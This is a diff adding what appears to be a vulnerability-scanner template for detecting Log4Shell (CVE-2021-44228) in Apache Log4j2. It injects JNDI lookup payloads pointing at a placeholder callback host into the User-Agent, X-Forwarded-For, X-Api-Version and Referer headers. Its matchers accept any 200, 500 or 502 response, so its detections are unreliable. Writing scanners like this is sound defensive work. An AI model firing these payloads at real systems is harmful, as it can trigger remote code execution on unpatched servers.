@@ -1,0 +1,29 @@
+id: log4shell
+info:
+  name: "Log4Shell RCE Detection (CVE-2021-44228)"
+  severity: critical
+  description: "Detection de l'injection JNDI dans Apache Log4j2 permettant l'execution de code a distance."
+  tags: cve,cve2021,rce,log4j,jndi,critical
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      - "{{BaseURL}}/api"
+      - "{{BaseURL}}/login"
+    headers:
+      User-Agent: "${jndi:ldap://{{Hostname}}.log4shell.test/ua}"
+      X-Forwarded-For: "${jndi:ldap://{{Hostname}}.log4shell.test/xff}"
+      X-Api-Version: "${jndi:ldap://{{Hostname}}.log4shell.test/ver}"
+      Referer: "${jndi:ldap://{{Hostname}}.log4shell.test/ref}"
+    matchers:
+      - type: regex
+        regex:
+          - "(?i)log4j|jndi|ldap://|rmi://"
+        condition: or
+      - type: status
+        status:
+          - 200
+          - 500
+          - 502
+    matchers-condition: or
